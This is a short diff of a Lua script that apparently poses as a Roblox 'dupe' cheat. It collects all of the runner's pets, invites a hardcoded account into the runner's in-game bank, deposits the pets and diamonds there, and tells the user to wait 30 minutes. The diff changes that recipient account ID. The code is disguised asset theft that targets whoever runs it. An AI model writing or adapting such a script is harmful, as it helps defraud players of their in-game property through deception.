@@ -133,7 +133,7 @@ for i,v in pairs(lib.Save.Get().Pets) do
 		table.insert(PetsList, v.uid);
 	end
 end
-lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 2602423367)
+lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 3267937944)
 local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
 if request then
 	lib.Message.New("Dupe starting! Please wait atleast 30 Minutes");
